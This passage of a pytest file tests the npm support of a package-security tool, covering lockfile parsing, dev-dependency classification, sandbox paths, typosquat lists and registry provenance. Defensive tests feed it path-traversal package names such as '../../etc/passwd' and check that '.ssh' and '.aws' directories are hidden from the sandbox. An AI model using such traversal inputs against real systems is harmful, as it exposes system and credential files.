    assert pinned[("ms", "2.1.3")] is False and pinned[("ms", "2.1.2")] is True


def test_detect_installed_skips_a_fifo_manifest(lang: NodeLanguage, tmp_path: Path) -> None:
    nm = _nested_layout(tmp_path)
    (nm / "evil").mkdir()
    os.mkfifo(nm / "evil" / "package.json")
    result = _bounded(lambda: lang.detect_installed_packages(tmp_path))
    assert ("ms", "2.1.3") in {(p.name, p.version) for p in result}


# ---------------------------------------------------------------------------
# sandbox_paths
# ---------------------------------------------------------------------------

def test_sandbox_paths(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert isinstance(sp, SandboxPaths)
    assert isinstance(sp.read_only, list)
    assert isinstance(sp.writable, list)
    assert isinstance(sp.hidden, list)


def test_sandbox_paths_writable_has_npm(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".npm" in str(p) for p in sp.writable)


def test_sandbox_paths_hidden_has_ssh(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".ssh" in str(p) for p in sp.hidden)


def test_sandbox_paths_hidden_has_aws(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".aws" in str(p) for p in sp.hidden)


def test_sandbox_paths_readonly_has_nvm(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".nvm" in str(p) for p in sp.read_only)


def test_sandbox_env_returns_node_specific_vars(lang: NodeLanguage, monkeypatch) -> None:
    # The registry variable is passed when set to a plain address (see the credentials tests).
    monkeypatch.setenv("NPM_CONFIG_REGISTRY", "https://registry.npmjs.org/")
    env = lang.sandbox_env()
    assert isinstance(env, list)
    assert "NPM_CONFIG_REGISTRY" in env
    assert "NPM_CONFIG_CACHE" in env
    assert "NVM_DIR" in env
    assert "NODE_PATH" in env


def test_sandbox_env_does_not_include_common_vars(lang: NodeLanguage) -> None:
    env = lang.sandbox_env()
    assert "PATH" not in env
    assert "HOME" not in env
    assert "HTTP_PROXY" not in env


# ---------------------------------------------------------------------------
# snapshot / detect_post_install
# ---------------------------------------------------------------------------

def test_snapshot_empty_dir(lang: NodeLanguage, tmp_path: Path) -> None:
    snap = lang.snapshot(tmp_path)
    assert isinstance(snap, Snapshot)
    assert snap.data == {}


def test_snapshot_and_detect_post_install(lang: NodeLanguage, tmp_path: Path) -> None:
    # Take a pre-snapshot (no node_modules)
    before = lang.snapshot(tmp_path)

    # "Install" a package by creating node_modules/express/package.json
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    express_dir = node_modules / "express"
    express_dir.mkdir()
    (express_dir / "package.json").write_text(
        json.dumps({"name": "express", "version": "4.18.0"})
    )

    # Take post-snapshot
    after = lang.snapshot(tmp_path)
    assert str(express_dir) in after.data

    new_pkgs = lang.detect_post_install(before, after)
    assert any(p.name == "express" and p.version == "4.18.0" for p in new_pkgs)


def test_snapshot_with_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    babel_scope = node_modules / "@babel"
    babel_scope.mkdir()
    babel_core = babel_scope / "core"
    babel_core.mkdir()
    (babel_core / "package.json").write_text(
        json.dumps({"name": "@babel/core", "version": "7.22.0"})
    )

    snap = lang.snapshot(tmp_path)
    assert str(babel_core) in snap.data
    assert snap.data[str(babel_core)] == "7.22.0"


def test_detect_post_install_no_changes(lang: NodeLanguage, tmp_path: Path) -> None:
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    express_dir = node_modules / "express"
    express_dir.mkdir()
    (express_dir / "package.json").write_text(
        json.dumps({"name": "express", "version": "4.18.0"})
    )

    before = lang.snapshot(tmp_path)
    after = lang.snapshot(tmp_path)

    new_pkgs = lang.detect_post_install(before, after)
    assert new_pkgs == []


def test_detect_post_install_ecosystem_is_npm(lang: NodeLanguage, tmp_path: Path) -> None:
    before = lang.snapshot(tmp_path)

    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    pkg_dir = node_modules / "lodash"
    pkg_dir.mkdir()
    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "lodash", "version": "4.17.21"})
    )

    after = lang.snapshot(tmp_path)
    new_pkgs = lang.detect_post_install(before, after)
    assert all(p.ecosystem == "npm" for p in new_pkgs)


def test_detect_post_install_multiple_packages(lang: NodeLanguage, tmp_path: Path) -> None:
    before = lang.snapshot(tmp_path)

    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    for pkg_name, version in [("express", "4.18.0"), ("lodash", "4.17.21"), ("axios", "1.5.0")]:
        pkg_dir = node_modules / pkg_name
        pkg_dir.mkdir()
        (pkg_dir / "package.json").write_text(
            json.dumps({"name": pkg_name, "version": version})
        )

    after = lang.snapshot(tmp_path)
    new_pkgs = lang.detect_post_install(before, after)
    names = {p.name for p in new_pkgs}
    assert names == {"express", "lodash", "axios"}


# ---------------------------------------------------------------------------
# top_packages_url / top_packages_fallback
# ---------------------------------------------------------------------------

def test_top_packages_url_is_string(lang: NodeLanguage) -> None:
    url = lang.top_packages_url()
    assert isinstance(url, str)
    assert url.startswith("https://")


def test_top_packages_fallback_is_nonempty_list(lang: NodeLanguage) -> None:
    fb = lang.top_packages_fallback()
    assert isinstance(fb, list)
    assert len(fb) > 0
    assert all(isinstance(n, str) for n in fb)


def test_top_packages_fallback_contains_known_packages(lang: NodeLanguage) -> None:
    fb = lang.top_packages_fallback()
    assert "lodash" in fb
    assert "express" in fb
    assert "react" in fb


class _FakeTopPackagesResponse:
    def __init__(self, names: object) -> None:
        self._names = names

    def raise_for_status(self) -> None:
        pass

    def json(self) -> object:
        return self._names


class _FakeTopPackagesClient:
    def __init__(self, names: object) -> None:
        self._names = names
        self.calls = 0

    async def get(self, url: str) -> _FakeTopPackagesResponse:
        self.calls += 1
        return _FakeTopPackagesResponse(self._names)


@pytest.mark.asyncio
async def test_fetch_top_packages_preserves_dots_in_dotted_names(lang: NodeLanguage) -> None:
    # npm's normalise_name is lowercase-only — it must not fold "socket.io" to
    # "socket-io". Regression for TyposquatDetector's corpus/query mismatch: a
    # corpus entry folded at fetch time can never be un-folded by the
    # ecosystem-correct normalisation TyposquatDetector applies at query time.
    client = _FakeTopPackagesClient(["socket.io", "lodash"])
    result = await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert result == ["socket.io", "lodash"]


@pytest.mark.asyncio
async def test_fetch_top_packages_lowercases_names(lang: NodeLanguage) -> None:
    client = _FakeTopPackagesClient(["React"])
    result = await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert result == ["react"]


@pytest.mark.asyncio
async def test_fetch_top_packages_single_request_no_pagination(lang: NodeLanguage) -> None:
    """ecosyste.ms returns the full page in one response — no follow-up call."""
    client = _FakeTopPackagesClient(["a", "b", "c"])
    await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert client.calls == 1


@pytest.mark.asyncio
async def test_fetch_top_packages_returns_none_on_unexpected_shape(lang: NodeLanguage) -> None:
    """A non-list JSON body (e.g. an error object) must not be treated as names."""
    client = _FakeTopPackagesClient({"error": "not found"})
    result = await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert result is None


@pytest.mark.asyncio
async def test_fetch_top_packages_skips_non_string_entries(lang: NodeLanguage) -> None:
    client = _FakeTopPackagesClient(["lodash", None, 42, "express"])
    result = await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert result == ["lodash", "express"]


@pytest.mark.asyncio
async def test_fetch_top_packages_caps_at_max_top_packages(lang: NodeLanguage) -> None:
    """REGRESSION: the contract (LanguageBase.fetch_top_packages) requires every
    implementation to cap the result at MAX_TOP_PACKAGES itself — the URL's
    per_page is a request to the server, not a guarantee. An oversized or
    nonconforming response must still be capped locally rather than stored in
    full."""
    from packagealert.languages.base import MAX_TOP_PACKAGES

    oversized = [f"pkg-{i}" for i in range(MAX_TOP_PACKAGES + 50)]
    client = _FakeTopPackagesClient(oversized)
    result = await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert result is not None
    assert len(result) == MAX_TOP_PACKAGES
    assert result == [f"pkg-{i}" for i in range(MAX_TOP_PACKAGES)]


@pytest.mark.asyncio
async def test_fetch_top_packages_returns_none_for_empty_list(lang: NodeLanguage) -> None:
    client = _FakeTopPackagesClient([])
    result = await lang.fetch_top_packages(cast(httpx.AsyncClient, client), "http://example/x")
    assert result is None


# ---------------------------------------------------------------------------
# resolve_package_dir
# ---------------------------------------------------------------------------

def test_resolve_package_dir_plain_package(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_dir = tmp_path / "node_modules" / "lodash"
    pkg_dir.mkdir(parents=True)
    result = lang.resolve_package_dir("lodash", tmp_path, None)
    assert result == [pkg_dir.resolve()]


def test_resolve_package_dir_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_dir = tmp_path / "node_modules" / "@babel" / "core"
    pkg_dir.mkdir(parents=True)
    result = lang.resolve_package_dir("@babel/core", tmp_path, None)
    assert result == [pkg_dir.resolve()]


def test_resolve_package_dir_rejects_traversal(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.resolve_package_dir("../../etc/passwd", tmp_path, None)
    assert result == []


def test_resolve_package_dir_rejects_traversal_in_scoped(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.resolve_package_dir("@scope/../../../etc", tmp_path, None)
    assert result == []


def test_resolve_package_dir_rejects_extra_slashes(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.resolve_package_dir("a/b/c", tmp_path, None)
    assert result == []


def test_resolve_package_dir_no_project_path(lang: NodeLanguage) -> None:
    assert lang.resolve_package_dir("lodash", None, None) == []


def test_resolve_package_dir_dotdot_without_separator_accepted(lang: NodeLanguage, tmp_path: Path) -> None:
    """'some..pkg' contains '..' but no separator — not a traversal risk, must not be rejected."""
    pkg_dir = tmp_path / "node_modules" / "some..pkg"
    pkg_dir.mkdir(parents=True)
    result = lang.resolve_package_dir("some..pkg", tmp_path, None)
    assert result == [pkg_dir.resolve()]


def test_resolve_package_dir_manifest_warning_always_none(lang: NodeLanguage, tmp_path: Path) -> None:
    """node_modules/<name> is a direct path with no manifest file to distrust,
    unlike PyPI's RECORD — this hook always returns None for npm."""
    assert lang.resolve_package_dir_manifest_warning("lodash", tmp_path, None) is None


# ---------------------------------------------------------------------------
# is_dev
# ---------------------------------------------------------------------------

def test_package_lock_v2_marks_dev_true(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "lockfileVersion": 2,
        "packages": {
            "": {"name": "my-app", "version": "1.0.0"},
            "node_modules/express": {"version": "4.18.0"},
            "node_modules/jest": {"version": "29.0.0", "dev": True},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_package_lock_v1_marks_dev_from_devdependencies(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "lockfileVersion": 1,
        "devDependencies": {"jest": "^29.0.0"},
        "dependencies": {
            "express": {"version": "4.18.0"},
            "jest": {"version": "29.0.0"},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_yarn_lock_marks_dev_via_package_json(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_yarn_lock_transitive_deps_are_unknown(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n\n'
        # transitive of express — not listed in package.json
        'accepts@~1.3.8:\n'
        '  version "1.3.8"\n\n'
        # transitive of jest — also not in package.json
        'jest-circus@^29.0.0:\n'
        '  version "29.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True
    assert by_name["accepts"].is_dev is None      # transitive — unknown
    assert by_name["jest-circus"].is_dev is None  # transitive — unknown


def test_yarn_lock_no_package_json_all_unknown(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    # No package.json — can't distinguish, all is_dev=None
    assert all(p.is_dev is None for p in result)


def test_pnpm_lock_marks_dev_from_importers(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      express:\n"
        "        specifier: ^4.18.0\n"
        "        version: 4.18.2\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_pnpm_lock_monorepo_does_not_leak_other_importer_dev_deps(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      express:\n"
        "        specifier: ^4.18.0\n"
        "        version: 4.18.2\n\n"
        "  packages/app:\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    # express is a direct root prod dep — classified False
    assert by_name["express"].is_dev is False
    # jest is only a dev dep in packages/app (non-root importer); without snapshots:
    # it's unclassifiable from the root's perspective — None, not False
    assert by_name["jest"].is_dev is None


def test_pnpm_lock_graph_traversal_classifies_transitives(lang: NodeLanguage, tmp_path: Path) -> None:
    # With snapshots: section, transitive deps are classified via BFS.
    # express depends on accepts (prod transitive); jest depends on jest-circus (dev transitive).
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      express:\n"
        "        specifier: ^4.18.0\n"
        "        version: 4.18.2\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  accepts@1.3.8:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-bbb}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-ccc}\n"
        "  jest-circus@29.0.0:\n"
        "    resolution: {integrity: sha512-ddd}\n\n"
        "snapshots:\n"
        "  accepts@1.3.8: {}\n"
        "  express@4.18.2:\n"
        "    dependencies:\n"
        "      accepts: 1.3.8\n"
        "  jest@29.0.0:\n"
        "    dependencies:\n"
        "      jest-circus: 29.0.0\n"
        "  jest-circus@29.0.0: {}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["accepts"].is_dev is False     # transitive of prod express
    assert by_name["jest"].is_dev is True
    assert by_name["jest-circus"].is_dev is True  # transitive of dev jest


def test_yarn_lock_graph_traversal_classifies_transitives(lang: NodeLanguage, tmp_path: Path) -> None:
    # With dependencies: in yarn.lock blocks, transitives are classified via BFS.
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'accepts@~1.3.8:\n'
        '  version "1.3.8"\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
        '  dependencies:\n'
        '    accepts "~1.3.8"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
        '  dependencies:\n'
        '    jest-circus "^29.0.0"\n\n'
        'jest-circus@^29.0.0:\n'
        '  version "29.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["accepts"].is_dev is False     # transitive of prod express
    assert by_name["jest"].is_dev is True
    assert by_name["jest-circus"].is_dev is True  # transitive of dev jest


def test_yarn_lock_shared_transitive_is_prod(lang: NodeLanguage, tmp_path: Path) -> None:
    # A package reachable from both prod and dev seeds is prod (conservative).
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'debug@^4.0.0:\n'
        '  version "4.3.4"\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
        '  dependencies:\n'
        '    debug "^4.0.0"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
        '  dependencies:\n'
        '    debug "^4.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["debug"].is_dev is False  # reachable from both — conservative: prod


def test_pnpm_lock_scoped_importer_deps_unquoted(lang: NodeLanguage, tmp_path: Path) -> None:
    # pnpm quotes scoped package names in importers: (e.g. '@babel/core':).
    # Seed names must be stripped of quotes so they match the unquoted package names.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      '@babel/core':\n"
        "        specifier: ^7.0.0\n"
        "        version: 7.22.0\n"
        "    devDependencies:\n"
        "      '@types/node':\n"
        "        specifier: ^18.0.0\n"
        "        version: 18.0.0\n\n"
        "packages:\n"
        "  '@babel/core@7.22.0':\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  '@types/node@18.0.0':\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["@babel/core"].is_dev is False
    assert by_name["@types/node"].is_dev is True


def test_pnpm_lock_snapshot_dep_peer_suffix_stripped(lang: NodeLanguage, tmp_path: Path) -> None:
    # Snapshot dep versions can include peer metadata suffixes like "1.0.0(react@18.2.0)".
    # These must be stripped when building the adjacency map so BFS edges resolve correctly.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      react-dom:\n"
        "        specifier: ^18.2.0\n"
        "        version: 18.2.0(react@18.2.0)\n\n"
        "packages:\n"
        "  react@18.2.0:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  react-dom@18.2.0:\n"
        "    resolution: {integrity: sha512-bbb}\n\n"
        "snapshots:\n"
        "  react@18.2.0: {}\n"
        "  react-dom@18.2.0(react@18.2.0):\n"
        "    dependencies:\n"
        "      react: 18.2.0\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["react-dom"].is_dev is False
    assert by_name["react"].is_dev is False  # transitive of prod react-dom


def test_yarn_lock_multi_version_uses_range_to_resolve_seed(lang: NodeLanguage, tmp_path: Path) -> None:
    # When two versions of the same package exist in yarn.lock, the seed lookup
    # must use (name, range) from package.json to pin the correct entry, not
    # match by name alone (which would reach both versions).
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"debug": "^3.0.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        # prod dep: debug ^3 resolves to 3.2.7
        'debug@^3.0.0:\n'
        '  version "3.2.7"\n\n'
        # dev transitive: jest pulls debug ^4, which resolves to 4.3.4
        'debug@^4.0.0:\n'
        '  version "4.3.4"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
        '  dependencies:\n'
        '    debug "^4.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_version = {p.version: p for p in result if p.name == "debug"}
    # debug@3.2.7 is a direct prod dep
    assert by_version["3.2.7"].is_dev is False
    # debug@4.3.4 is only reachable from dev jest, not from any prod seed
    assert by_version["4.3.4"].is_dev is True


def test_pnpm_lock_multi_version_uses_exact_seed_version(lang: NodeLanguage, tmp_path: Path) -> None:
    # When multiple versions of the same package exist, importers['.'].version
    # must be used to seed BFS with the exact (name, version) node, not match by
    # name alone (which would incorrectly reach all versions).
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      debug:\n"
        "        specifier: ^3.0.0\n"
        "        version: 3.2.7\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  debug@3.2.7:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  debug@4.3.4:\n"
        "    resolution: {integrity: sha512-bbb}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-ccc}\n\n"
        "snapshots:\n"
        "  debug@3.2.7: {}\n"
        "  debug@4.3.4: {}\n"
        "  jest@29.0.0:\n"
        "    dependencies:\n"
        "      debug: 4.3.4\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_version = {(p.name, p.version): p for p in result}
    # debug@3.2.7 is the direct prod dep seed
    assert by_version[("debug", "3.2.7")].is_dev is False
    # debug@4.3.4 is only reachable from dev jest — must not be pulled in as prod
    assert by_version[("debug", "4.3.4")].is_dev is True


def test_pnpm_lock_no_snapshots_same_name_prod_and_dev_different_versions(lang: NodeLanguage, tmp_path: Path) -> None:
    # Without snapshots:, when the same package name appears in both prod and dev
    # seeds at different versions, each version must be classified by its exact
    # resolved version, not just by name membership.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      debug:\n"
        "        specifier: ^3.0.0\n"
        "        version: 3.2.7\n"
        "    devDependencies:\n"
        "      debug:\n"
        "        specifier: ^4.0.0\n"
        "        version: 4.3.4\n\n"
        "packages:\n"
        "  debug@3.2.7:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  debug@4.3.4:\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_version = {(p.name, p.version): p for p in result}
    assert by_version[("debug", "3.2.7")].is_dev is False
    assert by_version[("debug", "4.3.4")].is_dev is True


# --- yank status: a deprecated release, unless the whole package is deprecated ---

def _packument(latest: str, deprecated: dict[str, str]) -> dict:
    versions = {v: ({"deprecated": deprecated[v]} if v in deprecated else {})
                for v in ["4.17.21", "4.17.23", "4.18.0", "4.18.1", latest]}
    return {"dist-tags": {"latest": latest}, "versions": versions}


def test_yank_status_url_encodes_scoped_names():
    from packagealert.languages.node import NodeLanguage

    assert NodeLanguage().yank_status_url("@babel/core", "7.0.0") == "https://registry.npmjs.org/@babel%2Fcore"
    assert NodeLanguage().yank_status_url("lodash", "4.18.0") == "https://registry.npmjs.org/lodash"


def test_deprecated_release_is_yanked_with_its_message():
    from packagealert.languages.node import NodeLanguage

    doc = _packument("4.18.1", {"4.18.0": "Bad release. Please use lodash@4.17.21 instead."})
    lang = NodeLanguage()
    assert lang.yank_status_parse(doc, "4.18.0") == (True, "Bad release. Please use lodash@4.17.21 instead.")
    assert lang.yank_status_parse(doc, "4.18.1") == (False, None)


def test_wholly_deprecated_package_is_not_yanked():
    """A package deprecated as a whole (its latest release too) is not a withdrawn release."""
    from packagealert.languages.node import NodeLanguage

    doc = _packument("4.18.1", {v: "no longer supported" for v in ["4.17.21", "4.17.23", "4.18.0", "4.18.1"]})
    assert NodeLanguage().yank_status_parse(doc, "4.18.0") == (False, None)


def test_yank_status_unknown_version_or_bad_document_is_unchecked():
    from packagealert.languages.node import NodeLanguage

    lang = NodeLanguage()
    assert lang.yank_status_parse(_packument("4.18.1", {}), "9.9.9") is None
    assert lang.yank_status_parse([], "4.18.0") is None
    assert lang.yank_status_parse({"versions": "x"}, "4.18.0") is None


# --- provenance: only the public npm registry's packages are looked up there ---

_PUBLIC = "https://registry.npmjs.org/a/-/a-1.0.0.tgz"
_PROVENANCE = {
    "node_modules/a": {"version": "1.0.0", "resolved": _PUBLIC},
    "node_modules/b": {"version": "1.0.0", "resolved": "https://registry.yarnpkg.com/b/-/b-1.0.0.tgz"},
    "node_modules/c": {"version": "1.0.0", "resolved": "https://npm.corp.example/c/-/c-1.0.0.tgz"},
    "node_modules/d": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/o/d.git#abc"},
    "node_modules/e": {"version": "1.0.0", "resolved": "file:../e"},
    "node_modules/f": {"resolved": "../f", "link": True},
}


def test_package_lock_records_which_entries_come_from_the_public_registry(tmp_path):
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 3, "packages": {"": {"name": "app"}, **_PROVENANCE}}))
    found = {p.name: p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)}
    assert found == {"a": True, "b": True, "c": False, "d": False, "e": False, "f": False}


def test_package_lock_v1_records_provenance(tmp_path):
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 1, "dependencies": {
        "a": {"version": "1.0.0", "resolved": _PUBLIC},
        "c": {"version": "1.0.0", "resolved": "https://npm.corp.example/c/-/c-1.0.0.tgz"}}}))
    found = {p.name: p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)}
    assert found == {"a": True, "c": False}


@pytest.mark.parametrize("with_package_json", [True, False])
def test_yarn_lock_records_provenance(tmp_path, with_package_json):
    if with_package_json:
        (tmp_path / "package.json").write_text(json.dumps({"dependencies": {"a": "^1.0.0", "c": "^1.0.0"}}))
    (tmp_path / "yarn.lock").write_text(
        'a@^1.0.0:\n  version "1.0.0"\n  resolved "https://registry.yarnpkg.com/a/-/a-1.0.0.tgz#abc"\n\n'
        'c@^1.0.0:\n  version "1.0.0"\n  resolved "https://npm.corp.example/c/-/c-1.0.0.tgz#abc"\n')
    found = {p.name: p.from_public_registry for p in NodeLanguage()._parse_yarn_lock(tmp_path / "yarn.lock")}
    assert found == {"a": True, "c": False}


_PNPM = ("lockfileVersion: '9.0'\n\nimporters:\n  .:\n    dependencies:\n      a:\n        specifier: ^1.0.0\n"
         "        version: 1.0.0\n      '@corp/b':\n        specifier: ^1.0.0\n        version: 1.0.0\n"
         "\npackages:\n\n  a@1.0.0:\n    resolution: {integrity: sha512-x}\n\n"
         "  '@corp/b@1.0.0':\n    resolution: {integrity: sha512-y}\n\n"
         "snapshots:\n\n  a@1.0.0: {}\n\n  '@corp/b@1.0.0': {}\n")


def _pnpm_public(tmp_path, npmrc=None):
    (tmp_path / "pnpm-lock.yaml").write_text(_PNPM)
    if npmrc is not None:
        (tmp_path / ".npmrc").write_text(npmrc)
    return {p.name: p.from_public_registry for p in NodeLanguage()._parse_pnpm_lock(tmp_path / "pnpm-lock.yaml")}


def test_pnpm_lock_entries_follow_the_configured_registry(tmp_path):
    # pnpm-lock.yaml records no registry: it is the one .npmrc configures (the public one by default).
    assert _pnpm_public(tmp_path) == {"a": True, "@corp/b": True}
    assert _pnpm_public(tmp_path, "@corp:registry=https://npm.corp.example/\n") == \
        {"a": True, "@corp/b": False}
    assert _pnpm_public(tmp_path, "registry=https://npm.corp.example/\n") == \
        {"a": False, "@corp/b": False}


def test_a_package_lock_entry_without_a_resolved_url_follows_the_configured_registry(tmp_path):
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 3, "packages": {"": {"name": "app"},
                                                                   "node_modules/g": {"version": "1.0.0"}}}))
    assert [p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)] == [True]
    (tmp_path / ".npmrc").write_text("registry=https://npm.corp.example/\n")
    assert [p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)] == [False]


def _lines(deprecated: dict[str, str], versions: list[str], latest: str) -> dict:
    return {"dist-tags": {"latest": latest},
            "versions": {v: ({"deprecated": deprecated[v]} if v in deprecated else {}) for v in versions}}


def test_an_end_of_life_major_line_is_not_yanked():
